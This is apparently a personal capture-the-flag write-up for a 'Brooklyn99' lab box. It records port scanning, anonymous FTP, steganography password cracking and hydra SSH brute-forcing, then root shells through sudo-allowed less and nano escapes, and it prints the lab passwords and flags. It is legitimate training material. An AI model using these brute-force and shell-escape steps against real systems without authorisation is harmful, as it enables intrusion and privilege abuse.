# Box Name

## Brooklyn99

## Overview
---
* [[#Enumeration]]
	* nmap,ftp,hydra

* [[#Initial Foothold]]
	* ssh

* [[#Privilege Escalation]]
	* gtfobins *less*

---
## Enumeration

  ### nmap

```bash

┌──(kn1ght㉿Kali)-[~/THM/Brooklyn99]
└─$ rustscan -r 1-65535 -a 10.10.77.0 --ulimit 5000 -- -sCV -oN nmap/all_ports
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.77.0:22
Open 10.10.77.0:21
Open 10.10.77.0:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.13.55
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=
|   256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


```

### http
 - ### went to webpage 
	 - downloaded image on web page
	 - ![[Pasted image 20220524173902.png]]

- ### used steegsek to extract text file
	-  got creds for holt
```bash
┌──(kn1ght㉿Kali)-[~/THM/Brooklyn99/files]
└─$ stegseek brooklyn99.jpg ~/rockyou.txt
StegSeek version 0.5
Progress: 0.34% (479700 bytes)           

[i] --> Found passphrase: "admin"
[i] Original filename: "note.txt"
[i] Extracting to "brooklyn99.jpg.out"
                                                                                                                                                                                                                                           
┌──(kn1ght㉿Kali)-[~/THM/Brooklyn99/files]
└─$ cat brooklyn99.jpg.out 
Holts Password:
fluffydog12@ninenine

Enjoy!!
```
### ftp
-  anonymous login enabled
	- found note_to_jake.txt
```bash
ftp> get note_to_jake.txt -
remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||32571|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

 ### hydra
 - ### used hydra and quickly found Jake's creds
	
```bash
┌──(kn1ght㉿Kali)-[~/THM/Brooklyn99]
└─$ hydra -l jake -P ~/rockyou.txt ssh://10.10.77.0 -t 20

[DATA] attacking ssh://10.10.77.0:22/
[22][ssh] host: 10.10.77.0   login: jake   password: 987654321
```

## Initial Foothold


### ssh
 - logged into ssh as jacke
	 - sudo -l shows jake can run /usr/bin/less as anyone with out a password
```bash
jake@brookly_nine_nine:~$ sudo -l -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:

Sudoers entry:
    RunAsUsers: ALL
    Options: !authenticate
    Commands:
	/usr/bin/less
```

 - logged into ssh as holt
	 - sudo -l shows holt can run /bin/nano anyone with out a password
```bash
holt@brookly_nine_nine:~$ sudo -l -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:

Sudoers entry:
    RunAsUsers: ALL
    Options: !authenticate
    Commands:
	/bin/nano


```
---
## Privilege Escalation
----
### [[gtfobins]]

 -  searched gtfobins for less
	 - less /etc/profile
		 - !/bin/sh
	
![[Pasted image 20220524181014.png]]

```
jake@brookly_nine_nine:~$ sudo -u root /usr/bin/less /etc/passwd

root@brookly_nine_nine:~# id
uid=0(root) gid=0(root) groups=0(root)
root@brookly_nine_nine:~# 
```

```bash
root@brookly_nine_nine:~# ls -la
total 44
drwxr-xr-x 6 jake jake 4096 May 26  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw------- 1 root root 1349 May 26  2020 .bash_history
-rw-r--r-- 1 jake jake  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jake jake 3771 Apr  4  2018 .bashrc
drwx------ 2 jake jake 4096 May 17  2020 .cache
drwx------ 3 jake jake 4096 May 17  2020 .gnupg
-rw------- 1 root root   67 May 26  2020 .lesshst
drwxrwxr-x 3 jake jake 4096 May 26  2020 .local
-rw-r--r-- 1 jake jake  807 Apr  4  2018 .profile
drwx------ 2 jake jake 4096 May 18  2020 .ssh
-rw-r--r-- 1 jake jake    0 May 17  2020 .sudo_as_admin_successful
```


```bash
root@brookly_nine_nine:~# ls -la ../amy
total 32
drwxr-xr-x 5 amy  amy  4096 May 18  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw-r--r-- 1 amy  amy   220 May 17  2020 .bash_logout
-rw-r--r-- 1 amy  amy  3771 May 17  2020 .bashrc
drwx------ 2 amy  amy  4096 May 18  2020 .cache
drwx------ 3 amy  amy  4096 May 18  2020 .gnupg
-rw-r--r-- 1 amy  amy   807 May 17  2020 .profile
drwx------ 2 amy  amy  4096 May 17  2020 .ssh
```

```bash
root@brookly_nine_nine:~# ls -la ../holt
total 48
drwxr-xr-x 6 holt holt 4096 May 26  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw------- 1 holt holt   18 May 26  2020 .bash_history
-rw-r--r-- 1 holt holt  220 May 17  2020 .bash_logout
-rw-r--r-- 1 holt holt 3771 May 17  2020 .bashrc
drwx------ 2 holt holt 4096 May 18  2020 .cache
drwx------ 3 holt holt 4096 May 18  2020 .gnupg
drwxrwxr-x 3 holt holt 4096 May 17  2020 .local
-rw-r--r-- 1 holt holt  807 May 17  2020 .profile
drwx------ 2 holt holt 4096 May 18  2020 .ssh
-rw------- 1 root root  110 May 18  2020 nano.save
-rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt
```

```bash
root@brookly_nine_nine:~# cat ../holt/user.txt
ee11cbb19052e40b07aac0ca060c23ee
root@brookly_nine_nine:~# 

root@brookly_nine_nine:~# cat /root/root.txt
"-- Creator : Fsociety2006 --"
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!
```



- searched gtfobins for nano
	- nano -s /bin/sh
	- /bin/sh
	- ^ T

```bash
holt@brookly_nine_nine:~$ sudo -u root /bin/nano -s /bin/sh

```

![[Pasted image 20220524180036.png]]

^ T

```bash
holt@brookly_nine_nine:~$ sudo -u root /bin/nano -s /bin/sh

# id;whoami
uid=0(root) gid=0(root) groups=0(root)
root
# 
```

